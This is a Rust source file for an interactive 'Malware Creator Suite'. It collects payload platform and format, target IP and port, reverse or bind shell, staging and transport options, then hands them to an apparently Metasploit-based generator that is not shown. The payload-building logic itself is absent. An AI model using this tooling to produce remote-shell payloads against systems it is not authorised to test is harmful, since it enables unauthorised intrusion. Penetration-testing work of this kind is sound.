use crate::global::msfconsole::msfconsole_creator;
use crate::global::input_helper::{prompt_user, prompt_ip, prompt_port};

pub fn create_malware(){
    println!("Malware Creator Suite");

    let malware_os = prompt_user("What is the OS of exploit (e.g., windows/linux/mac)
        - APK
        - ASP
        - ASPX
        - Bash [.sh]
        - Java [.jsp]
        - Linux [.elf]
        - OSX [.macho]
        - Perl [.pl]
        - PHP
        - Powershell [.ps1]
        - Python [.py]
        - Tomcat [.war]
        - Windows [.exe // .exe // .dll]");

    let target_ip=prompt_ip("What is the target IP");
    let target_port=prompt_port("What is the target port");
    let target_shell=prompt_user("Wat is the shell (CMD or MSF)");
    let target_direction=prompt_user("What is te direction (reverse/bind)");
    let target_stage=prompt_user("What is the stager (Staged/Stageless)");
    let target_method=prompt_user("What is the method (tcp/http/https/find_port)");
    let target_b_or_l=prompt_user("Batch or loop");
    let verbose=prompt_user("Verbose? (Y/n)");

    println!("\n--- Summary of Malware Configuration ---");
    println!("Malware OS:   {}", malware_os);
    println!("Target IP:    {}", target_ip);
    println!("Target Port:  {}", target_port);
    println!("Shell:        {}", target_shell);
    println!("Direction:    {}", target_direction);
    println!("Stager:       {}", target_stage);
    println!("Method:       {}", target_method);
    println!("Format:       {}", target_b_or_l);
    println!("Verbose:      {}", verbose);

    msfconsole_creator(
        malware_os, 
        target_ip, 
        target_port, 
        target_shell,
        target_direction,
        target_stage,
        target_method,
        target_b_or_l,
        verbose
        );
}
